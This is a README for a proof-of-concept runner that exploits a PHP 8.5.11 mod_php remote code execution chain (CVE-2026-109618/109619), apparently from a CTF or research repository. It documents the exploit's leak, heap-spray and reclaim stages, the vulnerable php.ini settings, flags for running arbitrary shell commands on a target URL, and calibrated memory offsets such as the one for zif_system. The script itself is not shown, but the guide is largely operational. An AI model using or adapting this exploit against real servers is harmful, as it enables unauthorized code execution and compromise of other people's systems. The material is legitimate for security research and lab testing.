# PoC runner: `p2b_rce.py`

A standalone runner for the CVE-2026-109618/109619 in-band ASLR-bypass RCE on
**PHP 8.5.11 mod_php (Apache prefork)**. Implements the public
[alvarodh5/php2shell](https://github.com/alvarodh5) chain (9bie / dinosn research) with TLS
transport, in-band HTTP proof read-back, a `sleep` timing oracle, and the command-length /
hit-rate fixes described in [`../README.md`](../README.md#4-two-things-the-published-poc-doesnt-solve).

- **No dependencies.** Python 3 standard library only (`socket`, `ssl`, `struct`, `argparse`, …).
- **No target baked in.** The victim is a required `-u/--url` argument. The module constants are
  *offsets* for the stock `php:8.5.11-apache` build (BuildID `13ba0901…`), not addresses. The live
  Zend-MM and libphp bases are leaked fresh over HTTP on every run.

> ⚠️ **Authorized targets only.** Point this at your own lab (below) or a host you have explicit
> written authorization to test. See the repository's [Responsible use](../README.md#responsible-use)
> section. The chain was originally run under the CodeWall 2Bitcoin CTF safe-harbour.

## Reproduce against your own lab

Stand up the exact image the offsets were calibrated for:

```bash
docker run --rm -p 8085:80 \
  -e PHP_INI_SCAN_DIR=/usr/local/etc/php/conf.d \
  php:8.5.11-apache
# then drop a php.ini with the vulnerable posture into conf.d:
#   memory_limit = 8M
#   display_errors = On
#   session.upload_progress.enabled = On
#   post_max_size = 32M   (anything comfortably above the ~10MB OOM field)
```

Fire it, confirming control flow first with the timing oracle (reads no data):

```bash
# 1) prove code execution safely (reclaim latency should spike to ~9s on a hit)
python3 p2b_rce.py -u http://127.0.0.1:8085/index.php -c 'sleep 9'

# 2) run a real command; output returns in-band in the HTTP response
python3 p2b_rce.py -u http://127.0.0.1:8085/index.php -c 'id; uname -a'
```

## Key flags

| Flag | Default | Meaning |
|---|---|---|
| `-u, --url` | *(required)* | Target PHP endpoint (e.g. `https://host/index.php`) |
| `-c, --cmd` | `id>/tmp/x` | Shell command to run (arbitrary length, ≤455 B via carrier spray) |
| `--huge` | `HUGE_MB` | Size (MB) of the OOM trigger field; must exceed `memory_limit` (~10 works for 8M) |
| `--s1`, `--s2` | `6`, `6` | Stage-1 / stage-2 leak retry counts (bump if a leak doesn't return) |
| `--retries` | `9` | Stage-3 reclaim attempts (the race; ~⅓ hit rate per attempt) |
| `--ht-spray` | `16` | Fake-HashTable copies per attempt (contention hardening) |
| `--ncarr` | `96` | Command-carrier copies sprayed after the HT |
| `--cmdoff` | `0x99000` | Chunk-relative offset of the command-carrier run |
| `--chunk-base`, `--libphp-base` | `0` | Skip stage 1/2 and supply already-leaked bases (debugging) |
| `--proof-url` | `""` | HTTP path to GET for proof (legacy writable-webroot mode) |
| `--proof-cmd` | `""` | Local docker container name to read proof via `docker exec` (lab only) |

## Offsets (stock `php:8.5.11-apache`, x86-64)

These are compile-time offsets *within* the randomized regions, so they hold across ASLR and across
workers for this exact build. Recalibrate if you change `--ht-spray`/`--ncarr` or the image.

| Symbol | Offset | Note |
|---|---|---|
| `zif_system` | `libphp + 0x5996e0` | native handler for `system()` |
| `zval_ptr_dtor` | `libphp + 0x7b47a0` | used for the stage-2 code-ptr sanity check |
| `htdata` | `chunk + 0x7e0d8` | fake-HT reclaim slot (stable across runs/ASLR modes) |
